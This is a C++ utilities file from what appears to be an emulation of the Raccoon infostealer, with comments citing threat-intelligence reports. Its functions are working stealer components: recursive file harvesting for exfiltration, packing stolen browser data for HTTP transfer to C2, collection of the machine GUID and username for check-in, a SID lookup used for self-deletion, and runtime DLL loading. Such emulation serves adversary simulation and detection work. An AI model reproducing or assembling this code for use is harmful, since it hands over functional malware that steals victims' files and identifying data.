#include "utils.h"


/*****************************
* FILE AND FOLDER OPERATIONS *
*****************************/

/**
* Uses the FindFirstFileW API and associated data to parse through
* directories and files and calls filters, when enabled, prior to exfiling
* files in place
* 
* Note: Very few details were provided on how Raccoon implemented this functionality.
* It's also not a great example of clean code, so apologies.
* 
* Sources:
* - Sekoia
* - AnyRun
*/
vector<wstring> getPaths(wstring basePath, vector<wstring> filters,
    vector<wstring> exclusions, int sizeLimit, bool recurse, int searchType) {

    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAW fileData;
    wstring currentFile;
    wstring currentPath;
    stack<wstring> directoryStack;
    vector<wstring> filePaths;

    // Parse the path, if needed
    wstring cleanPath = parseFolderShortcut(basePath);

    directoryStack.push(cleanPath);

    // Cycle through the directory stack
    // This will only run once if recursion wasn't selected
    while (!directoryStack.empty()) {
        currentPath = directoryStack.top();
        currentFile = currentPath + g_asteriskWithSlash;
        directoryStack.pop();

        hFind = g_racFindFirstFileW(currentFile.c_str(), &fileData);
        if (hFind == INVALID_HANDLE_VALUE) {
            return filePaths;
        }

        // Filter through the children, adding directories to the stack
        // and exfiling files
        do {
            // Skip the hidden current/parent links
            if (wcscmp(fileData.cFileName, g_dot.c_str()) != 0 &&
                wcscmp(fileData.cFileName, g_doubleDot.c_str()) != 0) {

                // Check for directories and push to the stack if recursion is enabled
                // and it isn't an excluded directory
                if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    bool exclude = false;

                    // Only evaluate the directory if recursion or we want directory names
                    if (recurse || (searchType == DIRECTORIES)) {

                        // Check for exclusions
                        if (!exclusions.empty()) {
                            exclude = isMatch(wstring(fileData.cFileName), exclusions);

                        }

                        // Push to stack if recursion is enabled and it isn't excluded
                        if (!exclude && recurse) {
                            directoryStack.push(currentPath + g_backSlash + fileData.cFileName);
                        }

                        // Push to the supplied vector if the search type is directories
                        if (!exclude && (searchType == DIRECTORIES)) {
                            filePaths.push_back(currentPath + g_backSlash + fileData.cFileName);
                        }

                    }

                }
                // Skip any non-directories if it is a directory search
                else if (searchType == DIRECTORIES) {
                    continue;
                }
                // Check if file filters were supplied and only exfil ones that match name and size
                else if (!filters.empty()) {
                    bool include = isMatch(wstring(fileData.cFileName), filters);

                    if (include && isUnderSizeLimit(fileData, sizeLimit)) {
                        filePaths.push_back(currentPath + g_backSlash + fileData.cFileName);
                    }

                }
                // Check if the file is under the supplied size limit without concern for filters
                else if (isUnderSizeLimit(fileData, sizeLimit)) {
                    filePaths.push_back(currentPath + g_backSlash + fileData.cFileName);
                }
            }

        } while (FindNextFile(hFind, &fileData) != 0);
    }

    g_racFindClose(hFind);

    return filePaths;
}

/**
* Looks for a supplied environment mask and expands the file path
* to the designated location using SHGetKnownFolderPath. If no shortcut
* is found, it returns the original path.
* 
* NOTE: Currently only supports %USERPROFILE% based on demonstrated functionality
* 
* Sources:
* - No direct reference, inferred capability based on storage location
* 
*/
wstring parseFolderShortcut(wstring path) {
    wregex shortcut(g_folderShortcutParser); //foldershortcut
    wsmatch m;
    wstring folder;
    if (regex_search(path.cbegin(), path.cend(), m, shortcut)) {
        // Get the index of the second % to join the rest of the path later
        int matchEnd = m.position() + m.length();

        // Strip off the % since std::regex doesn't support lookbehind
        wstring temp(m.str());
        temp.pop_back();
        temp = temp.substr(1, temp.back());

        // Grab the expanded folder path
        // Currently only supports USERPROFILE
        if (regex_match(temp, wregex(g_userProfile))) {
            LPWSTR pPath;
            g_racSHGetKnownFolderPath(FOLDERID_Profile,
                NULL,
                NULL,
                &pPath);
            folder = wstring(pPath);
            temp = path.substr(matchEnd, path.back());
            return folder + temp;
        }
        else {
            // Failed to get user profile, default to public
            return g_publicPath + path.substr(matchEnd, path.back());
        }
    }

    // Did not need expansion
    return path;
}

/**
* Checks whether the supplied file path matches a filter (positive or negative)
* 
* Sources:
* - No direct reference, inferred capability
*/
bool isMatch(wstring path, vector<wstring> filter) {
    bool bMatch = false;

    for (int i = 0; i < filter.size(); i++) {
        wregex currentFilter(filter[i]);
        if (regex_search(path, currentFilter)) {
            bMatch = true;
            break;
        }
    }

    return bMatch;
}

/**
* Checks that the supplied file is under the designated size limit
* 
* Sources:
* - No direct reference, inferred capability from Raccoon configuration file
*/
bool isUnderSizeLimit(WIN32_FIND_DATAW fileData, int maxSizeKB) {
    bool bUnderLimit = false;
    ULARGE_INTEGER uli;
    ULONGLONG fileSize;
    ULONGLONG maxSize = maxSizeKB * 1000;

    // Ignore 0 values as "no cap"
    if (maxSize == 0) {
        return true;
    }

    uli.HighPart = fileData.nFileSizeHigh;
    uli.LowPart = fileData.nFileSizeLow;
    fileSize = uli.QuadPart;

    if (fileSize < maxSize) {
        bUnderLimit = true;
    }

    return bUnderLimit;
}

/**
* Sources:
* - No direct reference, inferred capability
*/
int writeToFile(wstring contents, wstring filePath) {
    try {
        wofstream outFile;
        outFile.open(filePath, ios::app);
        outFile << contents << endl;
        outFile.close();
    }
    catch (const ofstream::failure& e) {
        return -1;
    }
    return 0;
}

/**
* Sources:
* - No direct reference, inferred capability
*/
int writeBytesToFile(vector<char> bytes, wstring filePath) {
    try {
        ofstream outFile;
        outFile.open(filePath, ios::binary | ios::out);
        outFile.write(bytes.data(), bytes.size());
        outFile.close();
    }
    catch (const ofstream::failure& e) {
        return -1;
    }
    return 0;
}

/**
* Sources:
* - No direct reference, inferred capability
*/
vector<char> readBytesFromFile(wstring filepath) {
    vector<char> bytes;
    try {
        ifstream inFile(filepath, std::ios::binary);
        if (inFile.is_open()) {
            ifstream inFile(filepath, std::ios::binary);
            bytes = vector<char>(istreambuf_iterator<char>(inFile), istreambuf_iterator<char>());
            inFile.close();
        }
    }
    catch (ifstream::failure& e) {
        return bytes;
    }

    return bytes;

}



/*****************************
*     VARIOUS UTILITIES      *
*****************************/

/**
* Raccoon uses a variety of odd header info, which this function supports.
*/
wstring randString(size_t length) {
    auto randchar = []() -> char
    {
        const char charset[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[rand() % max_index];
    };
    wstring str(length, 0);
    std::generate_n(str.begin(), length, randchar);
    return str;
}

/**
* Appends a wide string's bytes to a vector to support exfiltration (e.g. browser theft) via HTTP comms
*
* Sources:
* - None, design decision to keep this simpler
*/
void appendWStringToVector(vector<char>& vec, const wstring& wstr) {
    string str(wstr.begin(), wstr.end());
    const char* bytes = reinterpret_cast<const char*>(str.c_str());
    size_t numBytes = wstr.size(); //* sizeof(wchar_t);
    vec.insert(vec.end(), bytes, bytes + numBytes);
}

/**
* Appends raw bytes to vector to support the HTTP comms
* 
* Sources:
* - None, design decision to keep this simpler
*/
void appendBytesToVector(vector<char>& vec, LPVOID lpBuffer, DWORD dwSize) {
    const char* bytes = static_cast<const char*>(lpBuffer);
    vec.insert(vec.end(), bytes, bytes + dwSize);
}


/**
* Parses the incoming configuration given a delimiter and returns a vector containing
* the tokens.
* 
* Sources:
* - No direct reference, inferred capability
*/
vector<wstring> parseGrabberConfigLineItems(wstring data, const wchar_t delims[]) {
    vector<wstring> tokens;
    wchar_t* nextToken = NULL;

    wchar_t* p = wcstok_s(&data[0], delims, &nextToken);
    while (p != NULL) {
        wstring temp(p);

        // Strip asterisks for later regex
        temp.erase(remove(temp.begin(), temp.end(), *g_asterisk.c_str()), temp.end());
        tokens.push_back(temp);

        p = wcstok_s(NULL, delims, &nextToken);
    }
    return tokens;
}

/** 
* Splits the library config line on the third instance of the delimiter. 
* (e.g. `https://localhost:port/token/lib` becomes `token/lib`
* We do this because our initial C2 server and our file hosting / exfil server are one-and-the-same
*
* Sources:
* - None, design decision to keep this simpler
*/
wstring stripLib(wstring orig) {
    wstring delim = g_forwardSlash;
    wstring subConf;
    for (int i = 1; i <= 3; i++)
    {
        subConf = orig.erase(0, orig.find(delim) + 1);
    }
    return orig;
}



/**********************************
* USER AND MACHINE DATA GATHERING *
**********************************/


/**
* Uses the HKLM\Software\Microsoft\Cryptography registry key to obtain the Machine GUID
* as part of the initial C2 checkin
* 
* Sources:
* - Sekoia
* - Zscaler
*/
wstring getMachineGUID() {
    BYTE* pRegData;
    LSTATUS openStatus;
    LSTATUS readStatus;
    DWORD bufSize = 260;
    DWORD regDataType = 1;
    HKEY hKey;

    pRegData = (BYTE*)g_racLocalAlloc(0x0, 260);

    openStatus = g_racRegOpenKeyExW(HKEY_LOCAL_MACHINE, g_reg_open_Cryptography.c_str(), 0, 0x20119u, &hKey);
    readStatus = g_racRegQueryValueExW(hKey, (LPWSTR)g_reg_query_MachineGUID.c_str(), 0, &regDataType, (LPBYTE)pRegData, &bufSize);

    if (openStatus || readStatus) {
        g_racRegCloseKey(hKey);
    }

    wstring data(reinterpret_cast<wchar_t*>(pRegData), 260);

    return data;
}

/**
* Grabs the username for use as part of the initial C2 checkin using GetUserNameW
* 
* Sources:
* - Sekoia
* - Zscaler
*/
wstring getUserName() {
    WCHAR* username;
    DWORD pcbBuffer;

    pcbBuffer = 257;
    username = (WCHAR*)g_racLocalAlloc(0x0, 514);
    g_racGetUserNameW(username, &pcbBuffer);
    wstring uname(username);
    g_racLocalFree(username);
    return uname;
}


/**
* Grabs the user's SID - used in crafting the Recycle Bin
* path to place into the bat file to fully remove the exe
* from disk
* 
* Sources:
* - None. Cleanup isn't well detailed
*/
wstring getUserSID() {
    wstring username = getUserName();
    LPWSTR sidString;
    DWORD cbSid = 0;
    TCHAR ReferencedDomainName[256] = { 0 };
    DWORD cchReferencedDomainName = 0;
    DWORD dwReturnValue = ERROR_SUCCESS;
    SID_NAME_USE snu;
    PSID pSid = NULL;

    cbSid = 0;
    cchReferencedDomainName = 255;

    g_racLookupAccountNameW(NULL,
        username.c_str(),
        pSid,
        &cbSid,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &snu);

    pSid = (PSID)g_racLocalAlloc(LMEM_FIXED, cbSid);
    cchReferencedDomainName = 255;

    if (g_racLookupAccountNameW(NULL,
        username.c_str(),
        pSid,
        &cbSid,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &snu))
    {

        g_racConvertSidToStringSidW(pSid, &sidString);
        return wstring(sidString);
    }

    return NULL;
}



/*****************************
*       DLL OPERATIONS       *
*****************************/

/**
* Loads a single DLL from disk - used during the mass DLL load during startup and
* any individual DLL loads (e.g. for Browser Theft)
* 
* Sources:
* - Sekoia
* - Zscaler
* - AnyRun
*/
HMODULE loadDLLFromDisk(wstring dllPath) {
    return g_racLoadLibraryW(dllPath.c_str()); // this will be NULL if the loadLib call fails
}

/**
* Use this function when you need to retain handles to the loaded DLLs. Primary use
* is the mass DLL load during startup to resolve function pointers.
* 
* Sources:
* - Sekoia
* - Zscaler
* - AnyRun
*/
int loadWindowsDLLs(unordered_map<wstring, HMODULE>& mHandles, wstring dllName) {
    HMODULE hMod = loadDLLFromDisk(dllName);
    if (!hMod) return -1;
    mHandles[dllName] = hMod;
    return 0;
}

/**
* Unloads a single DLL given a file handle. This is called during additional
* DLL loads for execution (e.g. for Browser Theft). If you want to unload
* the Windows DLLs loaded during startup, use unloadDLLs instead.
* 
* Sources:
* - CyberInt
* - Sekoia
* - Note: Not directly mentioned, but this is needed to delete the referenced folders
*/
bool unloadDLL(HMODULE hMod) {
    if (!hMod) return false;
    return g_racFreeLibrary(hMod);
}

/**
* Unloads multiple DLLs. Primarily used during cleanup to unload all of the
* Windows DLLs that were loaded during setup
* 
* Sources:
* - CyberInt
* - Sekoia
* - Note: Not directly mentioned
*/
bool unloadDLLs(unordered_map<wstring, HMODULE>& mHandles) {
    vector<wstring> keys;
    bool success = true;

    // Unload and get keys
    for (auto const& it : mHandles) {
        if (!unloadDLL(it.second)) {
            if (!g_racUnmapViewOfFile(it.second)) {
                success = false;
            }
        }
        keys.push_back(it.first);
    }

    // Erase
    for (int i = 0; i < keys.size(); i++) {
        mHandles.erase(keys[i]);
    }

    return success;
}
